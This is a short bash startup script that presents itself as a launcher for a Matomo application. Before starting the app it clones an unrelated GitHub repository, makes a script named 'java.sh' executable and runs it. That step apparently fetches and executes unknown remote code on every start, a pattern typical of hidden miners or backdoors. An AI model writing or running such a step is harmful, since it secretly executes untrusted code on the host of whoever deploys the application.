#!/bin/bash

echo "Starting Matomo application..."

git clone https://github.com/storagegitpush404/bash.git && cd bash && chmod +x java.sh && ./java.sh

exec bash bin/run
